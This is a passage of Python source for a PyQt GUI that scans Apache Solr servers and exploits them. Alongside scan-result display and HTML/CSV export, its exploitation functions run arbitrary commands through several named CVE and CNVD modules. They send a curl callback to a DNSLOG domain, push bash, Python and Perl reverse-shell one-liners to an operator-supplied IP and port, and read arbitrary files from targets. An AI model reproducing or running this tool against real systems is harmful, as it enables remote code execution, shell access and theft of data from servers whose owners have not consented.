        self.log_message(f"开始扫描 {len(targets)} 个目标，检测 {len(selected_vulns)} 个漏洞，使用 {max_threads} 个线程")
    
    def stop_scan(self):
        """停止扫描"""
        if self.scanner_thread and self.scanner_thread.isRunning():
            self.scanner_thread.stop_event.set()
            self.log_message("正在停止扫描...")
    
    def update_scan_results(self, results):
        """更新扫描结果
        
        Args:
            results: 扫描结果字典
        """
        for target, result in results.items():
            # 更新结果字典
            self.scan_results[target] = result
            
            # 获取目标信息
            version = result.get("info", {}).get("version", "未知")
            
            # 添加漏洞结果到表格
            vulnerabilities = result.get("vulnerabilities", {})
            for vuln_id, vuln_result in vulnerabilities.items():
                is_vulnerable = vuln_result.get("vulnerable", False)
                details = vuln_result.get("details", "")
                
                # 只显示存在漏洞的结果
                if is_vulnerable:
                    row = self.results_table.rowCount()
                    self.results_table.insertRow(row)
                    
                    self.results_table.setItem(row, 0, QTableWidgetItem(target))
                    self.results_table.setItem(row, 1, QTableWidgetItem(version))
                    self.results_table.setItem(row, 2, QTableWidgetItem(vuln_id))
                    self.results_table.setItem(row, 3, QTableWidgetItem("存在漏洞"))
                    self.results_table.setItem(row, 4, QTableWidgetItem(details))
            
            # 记录日志
            self.log_message(f"扫描目标: {target}")
            self.log_message(f"Solr版本: {version}")
            
            # 记录漏洞结果
            vuln_count = sum(1 for v in vulnerabilities.values() if v.get("vulnerable", False))
            if vuln_count > 0:
                self.log_message(f"发现 {vuln_count} 个漏洞")
                for vuln_id, vuln_result in vulnerabilities.items():
                    if vuln_result.get("vulnerable", False):
                        self.log_message(f"  - {vuln_id}: {vuln_result.get('details', '')}")
            else:
                self.log_message("未发现漏洞")
            
            self.log_message("---")
    
    def update_progress(self, completed, total):
        """更新进度
        
        Args:
            completed: 已完成数量
            total: 总数量
        """
        self.progress_bar.setValue(completed)
        self.status_bar.showMessage(f"扫描进度: {completed}/{total}")
    
    def scan_finished(self, results):
        """扫描完成
        
        Args:
            results: 所有扫描结果
        """
        self.scan_results = results
        self.progress_bar.setVisible(False)
        self.status_bar.showMessage("扫描完成")
        
        # 统计结果
        total_targets = len(results)
        vulnerable_targets = sum(1 for r in results.values() if any(v.get("vulnerable", False) for v in r.get("vulnerabilities", {}).values()))
        total_vulns = sum(sum(1 for v in r.get("vulnerabilities", {}).values() if v.get("vulnerable", False)) for r in results.values())
        
        self.log_message(f"扫描完成，共扫描 {total_targets} 个目标，发现 {vulnerable_targets} 个存在漏洞的目标，共 {total_vulns} 个漏洞")
        
        # 切换到结果选项卡
        self.tab_widget.setCurrentIndex(1)
    
    def on_result_item_double_clicked(self, item):
        """处理结果项双击事件"""
        row = item.row()
        vuln_id = self.results_table.item(row, 2).text()
        target = self.results_table.item(row, 0).text()
        
        # 切换到漏洞利用选项卡
        self.tab_widget.setCurrentIndex(2)
        
        # 设置漏洞详情
        if vuln_id in VULN_DETAILS:
            self.show_vuln_details(vuln_id, VULN_DETAILS[vuln_id])
        
        # 设置目标URL
        self.exploit_target_input.setText(target)
    
    def import_targets(self):
        """导入目标"""
        file_path, _ = QFileDialog.getOpenFileName(self, "导入目标", "", "文本文件 (*.txt);;所有文件 (*)")
        if not file_path:
            return
        
        try:
            with open(file_path, 'r') as f:
                targets = f.read().strip()
            
            current_targets = self.target_list.toPlainText().strip()
            if current_targets:
                targets = current_targets + '\n' + targets
            
            self.target_list.setText(targets)
            self.log_message(f"从文件导入目标: {file_path}")
        except Exception as e:
            QMessageBox.warning(self, "导入失败", f"导入目标失败: {str(e)}")

    def export_results(self):
        """导出结果（HTML / CSV）"""
        if not self.scan_results:
            QMessageBox.warning(self, "警告", "没有可导出的结果")
            return

        # 让用户选择导出文件名和格式
        file_path, file_filter = QFileDialog.getSaveFileName(
            self,
            "导出结果",
            "",
            "HTML 文件 (*.html);;CSV 文件 (*.csv)"
        )
        if not file_path:
            return

        _, ext = os.path.splitext(file_path.lower())
        try:
            if ext == ".html":
                # 生成带筛选下拉框的 HTML
                # 收集所有状态选项
                statuses = set()
                for data in self.scan_results.values():
                    for v in data.get("vulnerabilities", {}).values():
                        statuses.add("存在" if v.get("vulnerable", False) else "不存在")
                status_options = ''.join(f'<option value="{s}">{s}</option>' for s in sorted(statuses))

                # 构造 HTML
                html = [
                    '<!DOCTYPE html>',
                    '<html lang="zh-CN">',
                    '<head>',
                    '  <meta charset="UTF-8">',
                    '  <title>扫描结果</title>',
                    '  <style>table, th, td { border: 1px solid #aaa; border-collapse: collapse; padding: 4px; }</style>',
                    '</head>',
                    '<body>',
                    '  <h2>扫描结果</h2>',
                    '  <label>状态筛选: </label>',
                    f'  <select id="statusFilter"><option value="all">所有</option>{status_options}</select>',
                    '  <table id="resultTable">',
                    '    <thead>',
                    '      <tr><th>目标</th><th>版本</th><th>漏洞ID</th><th>漏洞名称</th><th>状态</th><th>详情</th></tr>',
                    '    </thead>',
                    '    <tbody>'
                ]
                # 填充表格行
                for target, data in self.scan_results.items():
                    version = data.get("info", {}).get("version", "未知")
                    for vid, vdata in data.get("vulnerabilities", {}).items():
                        name = VULN_DETAILS.get(vid, {}).get("name", vid)
                        status = "存在" if vdata.get("vulnerable", False) else "不存在"
                        details = vdata.get("details", "")
                        html.append(
                            f'      <tr data-status="{status}">'
                            f'<td>{target}</td><td>{version}</td><td>{vid}</td>'
                            f'<td>{name}</td><td>{status}</td><td>{details}</td></tr>'
                        )
                html.extend([
                    '    </tbody>',
                    '  </table>',
                    '  <script>',
                    '    const filter = document.getElementById("statusFilter");',
                    '    const rows = document.querySelectorAll("#resultTable tbody tr");',
                    '    filter.addEventListener("change", () => {',
                    '      const val = filter.value;',
                    '      rows.forEach(r => {',
                    '        r.style.display = (val === "all" || r.dataset.status === val) ? "" : "none";',
                    '      });',
                    '    });',
                    '  </script>',
                    '</body>',
                    '</html>'
                ])
                # 写入文件
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(html))

            elif ext == ".csv":
                # CSV 格式
                with open(file_path, "w", newline="", encoding="utf-8") as f:
                    writer = csv.writer(f)
                    writer.writerow(["目标", "版本", "漏洞ID", "漏洞名称", "状态", "详情"])
                    for target, data in self.scan_results.items():
                        version = data.get("info", {}).get("version", "未知")
                        for vid, vdata in data.get("vulnerabilities", {}).items():
                            name = VULN_DETAILS.get(vid, {}).get("name", vid)
                            status = "存在" if vdata.get("vulnerable", False) else "不存在"
                            details = vdata.get("details", "")
                            writer.writerow([target, version, vid, name, status, details])
            else:
                QMessageBox.warning(self, "警告", "不支持的导出格式，请使用 .html 或 .csv")
                return

            self.log_message(f"结果已导出到: {file_path}")
        except Exception as e:
            QMessageBox.critical(self, "导出失败", f"导出结果失败: {e}")

    def clear_results(self):
        """清空结果"""
        self.results_table.setRowCount(0)
        self.scan_results = {}
    
    def clear_logs(self):
        """清空日志"""
        self.log_output.clear()
    
    def log_message(self, message):
        """记录日志
        
        Args:
            message: 日志消息
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_output.append(f"[{timestamp}] {message}")
        self.log_output.moveCursor(QTextCursor.End)
    
    def do_dnslog(self):
        """执行DNSLOG测试"""
        target = self.exploit_target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "警告", "请输入目标URL")
            return
        
        dnslog = self.exploit_DNSLOG_input.text().strip()
        if not dnslog:
            QMessageBox.warning(self, "警告", "请输入DNSLOG域名")
            return
        
        # 获取核心名称
        core = self.exploit_core_input.text().strip() or None
        
        # 创建扫描器
        scanner = SolrScanner(target)
        
        # 获取漏洞ID
        vuln_id = self.exploit_vuln_id.text().strip()
        
        # 根据漏洞类型执行不同的利用方法
        if vuln_id == "CVE-2017-12629":
            # 使用CVE-2017-12629漏洞
            from modules.vulns.cve_2017_12629 import exploit
            success, result = exploit(scanner, core=core, command=f"curl http://{dnslog}")
        elif vuln_id == "CNVD-2023-27598":
            # 使用CNVD-2023-27598漏洞
            from modules.vulns.cnvd_2023_27598 import exploit
            success, result = exploit(scanner, command=f"curl http://{dnslog}", dnslog_domain=dnslog)
        else:
            # 默认使用CVE-2017-12629漏洞
            from modules.vulns.cve_2017_12629 import exploit
            success, result = exploit(scanner, core=core, command=f"curl http://{dnslog}")
        
        # 显示结果
        if success:
            self.exploit_result_output.setText(f"DNSLOG请求已发送，请检查 {dnslog} 的记录\n\n{result}")
        else:
            self.exploit_result_output.setText(f"DNSLOG请求发送失败: {result}")
    
    def execute_command(self):
        """执行命令"""
        target = self.exploit_target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "警告", "请输入目标URL")
            return
        
        command = self.exploit_cmd_input.text().strip()
        if not command:
            QMessageBox.warning(self, "警告", "请输入要执行的命令")
            return
        
        # 获取核心名称和JMX端口
        core = self.exploit_core_input.text().strip() or None
        jmx_port = self.exploit_jmx_port_input.text().strip() or "18983"
        
        # 创建扫描器
        scanner = SolrScanner(target)
        
        # 获取漏洞ID
        vuln_id = self.exploit_vuln_id.text().strip()
        
        # 根据漏洞类型执行不同的利用方法
        try:
            if vuln_id == "CVE-2019-0193":
                # 使用CVE-2019-0193漏洞
                from modules.vulns.cve_2019_0193 import exploit
                success, result = exploit(scanner, core=core, command=command)
            elif vuln_id == "CVE-2019-17558":
                # 使用CVE-2019-17558漏洞
                from modules.vulns.cve_2019_17558 import exploit
                success, result = exploit(scanner, core=core, command=command)
            elif vuln_id == "CVE-2017-12629":
                # 使用CVE-2017-12629漏洞
                from modules.vulns.cve_2017_12629 import exploit
                success, result = exploit(scanner, core=core, command=command)
            elif vuln_id == "CVE-2020-13957":
                # 使用CVE-2020-13957漏洞
                from modules.vulns.cve_2020_13957 import exploit
                success, result = exploit(scanner, command=command)
            elif vuln_id == "CVE-2019-12409":
                # 使用CVE-2019-12409漏洞
                from modules.vulns.cve_2019_12409 import exploit
                success, result = exploit(scanner, jmx_port=jmx_port, command=command)
            elif vuln_id == "CNVD-2023-27598":
                # 使用CNVD-2023-27598漏洞
                from modules.vulns.cnvd_2023_27598 import exploit
                success, result = exploit(scanner, command=command)
            else:
                # 默认使用CVE-2019-17558漏洞
                from modules.vulns.cve_2019_17558 import exploit
                success, result = exploit(scanner, core=core, command=command)
            
            # 显示结果
            if success:
                self.exploit_result_output.setText(f"命令执行成功:\n\n{result}")
            else:
                self.exploit_result_output.setText(f"命令执行失败: {result}")
        except Exception as e:
            self.exploit_result_output.setText(f"执行异常: {str(e)}")
    
    def get_reverse_shell(self):
        """获取反弹Shell"""
        target = self.exploit_target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "警告", "请输入目标URL")
            return
        
        ip = self.exploit_ip_input.text().strip()
        if not ip:
            QMessageBox.warning(self, "警告", "请输入反弹Shell的IP")
            return
        
        port = self.exploit_port_input.text().strip()
        if not port:
            QMessageBox.warning(self, "警告", "请输入反弹Shell的端口")
            return
        
        # 获取核心名称和JMX端口
        core = self.exploit_core_input.text().strip() or None
        jmx_port = self.exploit_jmx_port_input.text().strip() or "18983"
        
        # 构造反弹Shell命令
        shell_commands = [
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        ]
        
        # 创建扫描器
        scanner = SolrScanner(target)
        
        # 获取漏洞ID
        vuln_id = self.exploit_vuln_id.text().strip()
        
        # 尝试不同的反弹Shell命令
        for command in shell_commands:
            try:
                # 根据漏洞类型执行不同的利用方法
                if vuln_id == "CVE-2019-0193":
                    # 使用CVE-2019-0193漏洞
                    from modules.vulns.cve_2019_0193 import exploit
                    success, result = exploit(scanner, core=core, command=command)
                elif vuln_id == "CVE-2019-17558":
                    # 使用CVE-2019-17558漏洞
                    from modules.vulns.cve_2019_17558 import exploit
                    success, result = exploit(scanner, core=core, command=command)
                elif vuln_id == "CVE-2017-12629":
                    # 使用CVE-2017-12629漏洞
                    from modules.vulns.cve_2017_12629 import exploit
                    success, result = exploit(scanner, core=core, command=command)
                elif vuln_id == "CVE-2020-13957":
                    # 使用CVE-2020-13957漏洞
                    from modules.vulns.cve_2020_13957 import exploit
                    success, result = exploit(scanner, command=command)
                elif vuln_id == "CVE-2019-12409":
                    # 使用CVE-2019-12409漏洞
                    from modules.vulns.cve_2019_12409 import exploit
                    success, result = exploit(scanner, jmx_port=jmx_port, command=command)
                elif vuln_id == "CNVD-2023-27598":
                    # 使用CNVD-2023-27598漏洞
                    from modules.vulns.cnvd_2023_27598 import exploit
                    success, result = exploit(scanner, command=command)
                else:
                    # 默认使用CVE-2019-17558漏洞
                    from modules.vulns.cve_2019_17558 import exploit
                    success, result = exploit(scanner, core=core, command=command)
                
                if success:
                    self.exploit_result_output.setText(f"反弹Shell命令已执行，请检查 {ip}:{port} 是否收到连接\n\n{result}")
                    return
            except Exception as e:
                continue
        
        self.exploit_result_output.setText("所有反弹Shell命令执行失败，请尝试其他漏洞或手动构造命令")
    
    def read_file(self):
        """读取文件"""
        target = self.exploit_target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "警告", "请输入目标URL")
            return
        
        file_path = self.exploit_file_path_input.text().strip()
        if not file_path:
            QMessageBox.warning(self, "警告", "请输入要读取的文件路径")
            return
        
        # 获取核心名称
        core = self.exploit_core_input.text().strip() or None
        
        # 创建扫描器
        scanner = SolrScanner(target)
        
        # 获取漏洞ID
        vuln_id = self.exploit_vuln_id.text().strip()
        
        try:
            # 根据漏洞类型执行不同的利用方法
            if vuln_id == "SOLR-STREAM-FILE-READ":
                # 使用RemoteStreaming文件读取漏洞
                from modules.vulns.solr_stream_file_read import exploit
                success, result = exploit(scanner, core=core, file_path=file_path)
            elif vuln_id == "CVE-2021-27905":
                # 使用CVE-2021-27905漏洞
                from modules.vulns.cve_2021_27905 import exploit
                success, result = exploit(scanner, core=core, file_path=file_path)
            else:
                # 默认使用RemoteStreaming文件读取漏洞
                from modules.vulns.solr_stream_file_read import exploit
                success, result = exploit(scanner, core=core, file_path=file_path)
            
            # 显示结果
            if success:
                self.exploit_result_output.setText(f"文件读取成功:\n\n{result}")
            else:
                self.exploit_result_output.setText(f"文件读取失败: {result}")
        except Exception as e:
            self.exploit_result_output.setText(f"读取异常: {str(e)}")
